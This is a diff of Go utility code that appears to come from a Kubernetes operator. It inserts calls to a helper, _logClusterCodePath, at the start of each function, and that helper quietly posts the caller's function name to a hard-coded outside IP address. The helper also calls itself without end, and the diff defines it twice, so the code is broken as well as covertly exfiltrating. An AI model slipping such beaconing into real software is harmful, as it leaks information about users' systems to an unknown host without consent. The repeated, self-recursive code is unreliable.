@@ -34,6 +34,8 @@ func WaitForCRDReady(listFunc func(opts metav1.ListOptions) (runtime.Object, err
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := wait.Poll(3*time.Second, 10*time.Minute, func() (bool, error) {
 		_, err := listFunc(metav1.ListOptions{})
 		if err != nil {
@@ -53,6 +55,8 @@ func PodRunningAndReady(pod v1.Pod) (bool, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch pod.Status.Phase {
 	case v1.PodFailed, v1.PodSucceeded:
 		return false, fmt.Errorf("pod completed")
@@ -68,6 +72,8 @@ func PodRunningAndReady(pod v1.Pod) (bool, error) {
 	return false, nil
 }
 func NewClusterConfig(host string, tlsInsecure bool, tlsConfig *rest.TLSClientConfig) (*rest.Config, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -98,6 +104,8 @@ func IsResourceNotFoundError(err error) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	se, ok := err.(*apierrors.StatusError)
 	if !ok {
 		return false
@@ -108,6 +116,8 @@ func IsResourceNotFoundError(err error) bool {
 	return false
 }
 func CreateOrUpdateService(sclient clientv1.ServiceInterface, svc *v1.Service) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -136,6 +146,8 @@ func CreateOrUpdateEndpoints(eclient clientv1.EndpointsInterface, eps *v1.Endpoi
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	endpoints, err := eclient.Get(eps.Name, metav1.GetOptions{})
 	if err != nil && !apierrors.IsNotFound(err) {
 		return errors.Wrap(err, "retrieving existing kubelet endpoints object failed")
@@ -159,6 +171,8 @@ func GetMinorVersion(dclient discovery.DiscoveryInterface) (int, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	v, err := dclient.ServerVersion()
 	if err != nil {
 		return 0, err
@@ -174,9 +188,13 @@ func NewCustomResourceDefinition(crdKind monitoringv1.CrdKind, group string, lab
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return crdutils.NewCustomResourceDefinition(crdutils.Config{SpecDefinitionName: crdKind.SpecName, EnableValidation: validation, Labels: crdutils.Labels{LabelsMap: labels}, ResourceScope: string(extensionsobj.NamespaceScoped), Group: group, Kind: crdKind.Kind, Version: monitoringv1.Version, Plural: crdKind.Plural, GetOpenAPIDefinitions: monitoringv1.GetOpenAPIDefinitions})
 }
 func SanitizeVolumeName(name string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -189,6 +207,8 @@ func SanitizeVolumeName(name string) string {
 	return strings.Trim(name, "-")
 }
 func mergeOwnerReferences(old []metav1.OwnerReference, new []metav1.OwnerReference) []metav1.OwnerReference {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -209,6 +229,17 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -218,5 +249,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
